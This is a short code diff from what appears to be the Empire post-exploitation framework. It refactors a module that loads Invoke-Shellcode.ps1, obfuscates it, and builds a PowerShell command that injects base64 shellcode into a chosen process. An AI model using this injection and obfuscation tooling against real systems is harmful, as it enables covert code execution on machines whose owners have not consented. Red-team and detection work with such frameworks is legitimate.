@@ -4,6 +4,7 @@ from builtins import object
 from builtins import str
 from typing import Dict
 
+from empire.server.utils import data_util
 from empire.server.common import helpers
 from empire.server.common.module_models import PydanticModule
 
@@ -21,7 +22,7 @@ class Module(object):
 
         module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
             module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
             f = open(module_source, 'r')
@@ -65,6 +66,6 @@ class Module(object):
         script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(
             proc_id, encoded_sc)
         script += script_end
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
 
         return script
